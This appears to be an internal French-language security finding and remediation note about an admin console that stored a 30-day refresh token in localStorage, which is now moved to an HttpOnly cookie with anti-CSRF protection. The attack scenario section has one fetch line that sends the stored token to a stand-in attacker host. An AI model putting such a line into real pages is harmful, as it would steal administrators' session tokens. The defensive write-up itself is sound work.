# 21 — A11 : le jeton d'administrateur dormait dans le localStorage

> **Date :** 14 juillet 2026. Périmètre : **la console d'administration uniquement** — le
> tableau de bord vendeur Blazor est décommissionné.

---

## Le défaut

La console (Blazor **WebAssembly**) stockait ses deux jetons dans le `localStorage` :

```csharp
private const string KeyAccess  = "mp_access";
private const string KeyRefresh = "mp_refresh";   // ← 30 jours d'accès administrateur
```

`localStorage` est lisible par **n'importe quel script** s'exécutant sur la page.

**Le scénario, et il tient en une ligne :**

```js
fetch('https://attaquant.tld/x?t=' + localStorage.getItem('mp_refresh'))
```

Une seule XSS — une dépendance compromise, un champ mal échappé, une extension de
navigateur — et l'attaquant emporte un jeton valable **30 jours**. Il dispose alors d'un
**accès administrateur complet, depuis sa propre machine** : catalogue, dossiers KYB,
portefeuilles, versements. Fermer l'onglet n'y change rien. Changer d'ordinateur non plus.

---

## Le correctif

### Le jeton de rafraîchissement ne quitte plus le serveur en JSON

Il part dans un cookie **`HttpOnly`** — donc **invisible pour JavaScript**.

| | Avant | Après |
|---|---|---|
| Jeton de rafraîchissement | corps JSON → `localStorage` | cookie `HttpOnly`, `Secure`, `SameSite=Strict`, `Path=/admin/auth` |
| Jeton d'accès | `localStorage` | **mémoire seule**, 15 min |
| `/admin/auth/refresh` | jeton dans le corps | corps **vide** — le navigateur joint le cookie |
| `/admin/auth/logout` | jeton dans le corps | corps **vide** — le serveur lit le cookie et l'efface |

La garantie est **structurelle**, pas disciplinaire : `AdminAuthResponse` n'a **aucun champ**
où loger un jeton de rafraîchissement, et `AuthResult` côté console non plus. La console ne
peut pas divulguer ce qu'elle n'a jamais reçu — même compromise.

### Trois détails qui font la différence entre un correctif et une illusion

**1. `Path=/admin/auth`.** Sans lui, le cookie accompagnerait chacun des ~200 appels de la
console — et se retrouverait dans les logs d'accès, les traces, les proxies. Un secret qu'on
transmet 200 fois par minute finit toujours par se retrouver quelque part.

**2. En-tête anti-CSRF (`X-Admin-Refresh`).** Un cookie part **tout seul**. Sans garde, un
site malveillant ferait soumettre au navigateur de l'administrateur un formulaire vers
`/admin/auth/refresh` : le cookie suivrait, et l'attaquant obtiendrait un jeton d'accès. On
aurait fermé le vol par XSS **en ouvrant le CSRF**. Un formulaire HTML ne peut pas poser
d'en-tête personnalisé ; un `fetch` cross-origin qui en pose déclenche un preflight CORS,
que notre politique refuse. La protection tient **même si le cookie devait passer en
`SameSite=None`** — c'est pourquoi elle existe : `SameSite` seul serait une hypothèse sur le
déploiement, pas une garantie.

**3. Purge des jetons hérités.** Les jetons déjà écrits dans le navigateur des
administrateurs y **resteraient** — jusqu'à 30 jours, à la portée de la première XSS.
`AuthState.InitializeAsync` efface `mp_access`, `mp_refresh`, `mp_seller`, `mp_expires` au
démarrage. **Un correctif qui protège l'avenir mais laisse le passé exposé n'est pas un
correctif.**

---

## ⚠️ Ce que ce correctif NE fait PAS — et il faut le dire

**`HttpOnly` n'immunise pas contre le XSS.**

Un script injecté peut toujours appeler `/admin/auth/refresh` depuis le navigateur de la
victime : le cookie part tout seul, et le script récupère un jeton d'accès. Il peut agir,
tant que l'onglet est ouvert.

Ce qu'il **ne peut plus faire**, c'est **exfiltrer une clé de longue durée**. L'attaque
devient **confinée à la session ouverte de la victime**, au lieu de survivre un mois sur une
machine étrangère.

La différence n'est pas cosmétique — elle transforme une compromission **durable** en une
compromission **éphémère**. Mais elle ne dispense pas de corriger les XSS, et je ne veux pas
qu'on lise ce document en croyant le contraire.

---

## Contrainte de déploiement

`SameSite=Strict` fonctionne parce que la console (`admin.${ROOT_DOMAIN}`) et l'API partagent
le **même domaine racine** — donc le même « site » au sens SameSite.

**Si la console déménage un jour sur un autre domaine racine** (Netlify, Vercel, domaine de
secours), `Strict` empêchera le cookie de partir : les administrateurs seront déconnectés à
chaque rechargement de page, **sans erreur visible**. Il faudra alors :

```bash
Auth__RefreshCookie__SameSite=None
```

La garde anti-CSRF protège la route dans les deux cas.

---

## Ce qui reste, et ce qui n'est pas concerné

- **Applications mobiles (client, vendeur)** : elles gardent le jeton dans le corps JSON, et
  **c'est correct**. Une app native n'a pas de `localStorage`, pas de XSS, et stocke ses
  jetons dans le trousseau du système. Le cookie n'aurait aucun sens là-bas.

- **BFF Web** : il renvoie encore le jeton de rafraîchissement dans le corps. **Sans
  conséquence aujourd'hui** — la vitrine web n'existe pas encore (27 endpoints en `501`).
  ⚠️ **Mais le jour où elle sera construite, elle devra utiliser le même schéma de cookie.**
  Un front web qui range un jeton de 30 jours dans `localStorage`, ce serait rejouer
  exactement ce bug — sur une surface bien plus exposée que la console d'admin.

- **Tableau de bord vendeur Blazor** : décommissionné. Aucune action.
